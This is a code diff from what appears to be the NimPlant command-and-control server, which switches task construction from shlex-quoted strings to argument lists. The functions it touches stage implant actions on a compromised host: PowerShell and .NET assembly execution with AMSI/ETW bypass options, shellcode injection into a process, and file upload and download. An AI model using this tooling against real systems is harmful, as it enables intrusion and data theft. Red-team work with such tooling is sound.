@@ -3,7 +3,6 @@ import binascii
 import hashlib
 import json
 import os
-import shlex
 import sys
 import traceback
 
@@ -216,10 +215,7 @@ def execute_assembly(np: NimPlant, args, raw_command):
     assembly = encrypt_data(assembly, np.encryption_key)
     assembly_arguments = " ".join(args[k + 1 :])
 
-    command = " ".join(
-        shlex.quote(arg)
-        for arg in ["execute-assembly", amsi, etw, assembly, assembly_arguments]
-    )
+    command = list(["execute-assembly", amsi, etw, assembly, assembly_arguments])
 
     guid = np.add_task(command, task_friendly=raw_command)
     nimplant_print(
@@ -361,10 +357,7 @@ def inline_execute(np: NimPlant, args, raw_command):
     else:
         assembly_args_final = ""
 
-    command = " ".join(
-        shlex.quote(arg)
-        for arg in ["inline-execute", assembly, entry_point, assembly_args_final]
-    )
+    command = list(["inline-execute", assembly, entry_point, assembly_args_final])
 
     guid = np.add_task(command, task_friendly=raw_command)
     nimplant_print(
@@ -396,9 +389,7 @@ def powershell(np: NimPlant, args, raw_command):
         )
         return
 
-    command = " ".join(
-        shlex.quote(arg) for arg in ["powershell", amsi, etw, powershell_cmd]
-    )
+    command = list(["powershell", amsi, etw, powershell_cmd])
 
     guid = np.add_task(command, task_friendly=raw_command)
     nimplant_print("Staged powershell command for NimPlant.", np.guid, task_guid=guid)
@@ -423,9 +414,7 @@ def shinject(np: NimPlant, args, raw_command):
         shellcode = compress(shellcode, level=9)
         shellcode = encrypt_data(shellcode, np.encryption_key)
 
-        command = " ".join(
-            shlex.quote(arg) for arg in ["shinject", process_id, shellcode]
-        )
+        command = list(["shinject", process_id, shellcode])
 
         guid = np.add_task(command, task_friendly=raw_command)
         nimplant_print("Staged shinject command for NimPlant.", np.guid, task_guid=guid)
@@ -459,9 +448,7 @@ def upload_file(np: NimPlant, args, raw_command):
 
     if os.path.isfile(file_path):
         np.host_file(file_path)
-        command = " ".join(
-            shlex.quote(arg) for arg in ["upload", file_id, file_name, remote_path]
-        )
+        command = list(["upload", file_id, file_name, remote_path])
 
         guid = np.add_task(command, task_friendly=raw_command)
         nimplant_print("Staged upload command for NimPlant.", np.guid, task_guid=guid)
@@ -491,7 +478,7 @@ def download_file(np: NimPlant, args, raw_command):
 
     os.makedirs(os.path.dirname(local_path), exist_ok=True)
     np.receive_file(local_path)
-    command = " ".join(shlex.quote(arg) for arg in ["download", file_path])
+    command = list(["download", file_path])
 
     guid = np.add_task(command, task_friendly=raw_command)
     nimplant_print("Staged download command for NimPlant.", np.guid, task_guid=guid)
